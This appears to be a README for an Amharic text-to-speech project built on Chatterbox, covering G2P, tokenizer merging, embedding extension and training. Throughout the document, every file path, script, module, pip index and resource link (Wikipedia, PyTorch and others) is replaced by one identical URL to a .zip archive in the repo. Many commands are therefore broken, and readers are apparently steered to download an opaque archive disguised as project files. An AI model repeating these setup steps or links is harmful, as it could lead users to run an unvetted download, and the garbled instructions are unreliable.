# የአማርኛ ጽሁፍ ወደ ንግግር | Amharic Text-to-Speech

A comprehensive Amharic TTS system built on Chatterbox, featuring custom G2P, tokenizer extension, and multilingual fine-tuning.

🗣️ **Status:** Development/Training Phase
📚 **Language:** Amharic (አማርኛ) + English
🎯 **Goal:** High-quality Amharic speech synthesis

---

## 📋 Table of Contents

- [Features](#-features)
- [Quick Start](#-quick-start)
- [Installation](#-installation)
- [Data Preparation](#-data-preparation)
- [Training Pipeline](#-training-pipeline)
- [Usage](#-usage)
- [Project Structure](#-project-structure)
- [Technical Details](#-technical-details)
- [Troubleshooting](#-troubleshooting)

---

## ✨ Features

- **Native Amharic G2P**: Converts Ge'ez/Ethiopic script to phonemes
- **Extended Tokenizer**: Merges Amharic tokens with Chatterbox base (704 → 2000 tokens)
- **Embedding Freezing**: Preserves English tokens while training Amharic
- **Clean Gradio UI**: User-friendly interface with Amharic font support
- **LJSpeech Format**: Standard format for easy integration
- **Multilingual**: Supports both Amharic and English

---

## 🚀 Quick Start

```powershell
# 1. Clone and setup
git clone <your-repo>
cd amharic-tts
.\https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip

# 2. Activate environment
.\venv\Scripts\https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip

# 3. Test G2P and tokenizer
python -m https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip

# 4. Launch web interface (demo mode)
python https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
```

---

## 📦 Installation

### Requirements

- Windows 10/11
- Python 3.10 or later
- CUDA-capable GPU (for training)
- 8GB+ RAM
- 10GB+ disk space

### Automated Setup (Recommended)

```powershell
# Run the setup script
.\https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
```

### Manual Setup

```powershell
# Create virtual environment
python -m venv venv
.\venv\Scripts\https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip

# Install PyTorch (CUDA 11.8)
pip install torch torchvision torchaudio --index-url https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip

# Install dependencies
pip install -r https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
```

---

## 📁 Data Preparation

### Step 1: Collect Amharic Audio Data

Prepare your dataset in one of these formats:

**Format A: Simple (filename|text)**
```
https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip|ሰላም ለዓለም
https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip|አዲስ አበባ የኢትዮጵያ ዋና ከተማ ናት
```

**Format B: LJSpeech**
```
wavs/
  https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
  https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
```

### Step 2: Preprocess Audio

```powershell
python https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip `
  --audio-dir "path/to/your/audio" `
  --transcript "https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip" `
  --output "data/processed/ljspeech_format"
```

**Recommendations:**
- ✅ 10+ hours of audio (minimum)
- ✅ 22050 Hz sample rate
- ✅ 2-15 seconds per clip
- ✅ Clean audio (minimal noise)
- ✅ Single speaker (for best results)

---

## 🎓 Training Pipeline

### Overview

```
1. Train Amharic Tokenizer
2. Merge with Base Tokenizer
3. Extend Model Embeddings
4. Fine-tune with Frozen Embeddings
5. Evaluate and Deploy
```

### Step 1: Train Amharic Tokenizer

```powershell
python -c "
from https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip import train_amharic_tokenizer
train_amharic_tokenizer(
    data_file='https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip',
    output_dir='models/tokenizer',
    vocab_size=500
)
"
```

**Output:**
- `https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip`
- `https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip`

### Step 2: Merge Tokenizers

⚠️ **Important:** You need the base Chatterbox tokenizer first!

```powershell
# Download base Chatterbox tokenizer (if not available)
# Place it in https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip

python https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip `
  --base "https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip" `
  --amharic "https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip" `
  --output "https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip" `
  --validate
```

**What this does:**
- Loads base English tokens (0-703)
- Adds Amharic tokens (704+)
- Ensures no duplicates
- Creates merged vocabulary

### Step 3: Extend Model Embeddings

```powershell
# Download base Chatterbox model first
# Place it in https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip

python https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip `
  --model "https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip" `
  --output "https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip" `
  --original-size 704 `
  --new-size 2000
```

**What this does:**
- Extends text embedding table from 704 → 2000
- Preserves original 704 embeddings
- Randomly initializes new embeddings

### Step 4: Configure Training

Edit `https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip`:

```yaml
model:
  n_vocab: 2000  # Match your merged vocab size
  freeze_original_embeddings: true
  freeze_until_index: 704  # Freeze English tokens

data:
  dataset_path: "data/processed/ljspeech_format"

finetuning:
  pretrained_model: "https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip"
```

### Step 5: Train the Model

```powershell
# Training script (integrate with Chatterbox training)
# Follow Chatterbox documentation for training
# Make sure to use the training utilities:

python https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip --config https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
```

**Key Points:**
- Use `freeze_text_embeddings()` from `https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip`
- Monitor both English and Amharic validation samples
- Save checkpoints every 5000 steps

---

## 🎯 Usage

### Web Interface

```powershell
# Launch Gradio app
python https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip --port 7860

# With trained model
python https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip `
  --model "https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip" `
  --config "https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip"

# Create public link
python https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip --share
```

Visit: `http://localhost:7860`

### Python API

```python
from https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip import AmharicG2P
from https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip import AmharicTokenizer

# Initialize
g2p = AmharicG2P()
tokenizer = https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip("models/tokenizer", g2p=g2p)

# Convert text to phonemes
text = "ሰላም ለዓለም"
phonemes = https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip(text)
print(f"Phonemes: {phonemes}")

# Tokenize
tokens = https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip(text, use_phonemes=True)
print(f"Tokens: {tokens}")
```

---

## 📂 Project Structure

```
amharic-tts/
├── config/
│   └── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip       # Training configuration
├── data/
│   ├── raw/                        # Raw audio and transcripts
│   ├── processed/                  # Preprocessed LJSpeech format
│   └── metadata/                   # Dataset metadata
├── src/
│   ├── data_processing/
│   │   └── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip    # Audio preprocessing
│   ├── g2p/
│   │   └── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip         # Amharic G2P converter
│   ├── tokenizer/
│   │   └── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip   # Amharic tokenizer
│   ├── training/
│   │   └── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip         # Training utilities
│   └── inference/
├── scripts/
│   ├── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip        # Merge tokenizers
│   └── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip # Extend model
├── gradio_app/
│   └── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip                      # Web interface
├── models/
│   ├── tokenizer/                  # Trained tokenizers
│   ├── checkpoints/                # Training checkpoints
│   └── pretrained/                 # Pretrained models
├── logs/                           # Training logs
├── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip                # Dependencies
├── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip                       # Setup script
└── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip                       # This file
```

---

## 🔬 Technical Details

### Amharic G2P

The G2P system handles the Ge'ez/Ethiopic script:

- **33 base consonants** × **7 vowel orders** = 231+ characters
- Converts to IPA phonemes
- Handles gemination, palatalization, assimilation

### Tokenizer Architecture

**Base Chatterbox:**
- 704 tokens (English)
- BPE (Byte Pair Encoding)

**Extended:**
- 2000 tokens (English + Amharic)
- Indices 0-703: English (frozen during training)
- Indices 704+: Amharic (trainable)

### Training Strategy

Based on practical multilingual training experience:

1. **Freeze English embeddings** to preserve learned representations
2. **Train only Amharic embeddings** (704+)
3. **Use English data occasionally** to prevent forgetting (optional)
4. **Monitor both languages** during validation

---

## 🐛 Troubleshooting

### Common Issues

**1. Import Errors**

```powershell
# Make sure virtual environment is activated
.\venv\Scripts\https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip

# Reinstall dependencies
pip install -r https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
```

**2. CUDA Out of Memory**

- Reduce `batch_size` in config
- Use smaller audio clips
- Enable gradient accumulation

**3. Tokenizer Not Found**

```powershell
# Train tokenizer first
python -m https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
```

**4. Model Loading Fails**

- Check file paths in config
- Ensure model was extended correctly
- Verify vocab sizes match

**5. Poor Quality Output**

- Need more training data (10+ hours minimum)
- Increase training epochs
- Adjust learning rate
- Check audio preprocessing quality

### Getting Help

- Check logs in `logs/` directory
- Review training configuration
- Ensure all paths are correct
- Validate data preprocessing

---

## 📚 Resources

### Chatterbox TTS
- Repository: https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
- Paper: [Link to paper if available]

### Amharic Resources
- Amharic Wikipedia: https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
- Common Voice Amharic: https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip

### Tools
- Epitran (G2P): https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
- Gradio: https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
- PyTorch: https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip

---

## 🤝 Contributing

Contributions are welcome! Areas for improvement:

- Additional Amharic datasets
- Improved G2P rules
- Multi-speaker support
- Voice cloning capabilities
- Better preprocessing pipelines

---

## 📄 License

[Specify your license here]

---

## 🙏 Acknowledgments

- **Chatterbox TTS** for the base architecture
- **Epitran** for G2P foundation
- **Gradio** for the UI framework
- Video tutorial on multilingual training

---

## 📞 Contact

[Your contact information]

---

**Made with ❤️ for the Amharic language community**

የአማርኛ ቋንቋ ማህበረሰብ ለመገልገል በፍቅር የተሰራ
